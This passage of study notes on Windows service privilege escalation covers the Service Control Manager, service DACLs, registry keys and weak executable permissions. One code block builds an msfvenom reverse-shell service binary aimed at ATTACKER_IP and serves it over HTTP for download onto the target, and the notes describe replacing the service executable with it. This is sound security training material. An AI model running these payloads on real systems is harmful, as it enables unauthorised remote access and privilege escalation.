Windows services are managed by the Service Control Manager (SCM), which is responsible for overseeing the state of services, monitoring their current status, and providing a means to configure them as necessary.

To better understand the structure of a service, we can use the `sc qc` command:

```
sc qc <service>
```

Here, the `BINARY_PATH_NAME` parameter specifies the associated executable, while the `SERVICE_START_NAME` parameter indicates the account used to run the service.

Services have a Discretionary Access Control List (DACL) that defines permissions for actions like starting, stopping, and configuring the service. You can view the DACL using Process Hacker, available on your desktop.

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`.

![](../../Attachments/Pasted%20image%2020240810183544.png)

Each service has a registry subkey where the `ImagePath` shows the executable and `ObjectName` indicates the account used to start the service. If configured, the DACL is stored in the `Security` subkey, and only administrators can modify these entries by default.

# Insecure Permissions on Service Executable

If a service's executable has weak permissions, an attacker could easily modify or replace it, thereby gaining the privileges of the service's account.

For example: having a service executable with (M) permission on "Everyone" group, then we can generate our own payload using msfvenom and serve it through a python webserver:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
# Next
python3 -m http.server
# On Target
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well.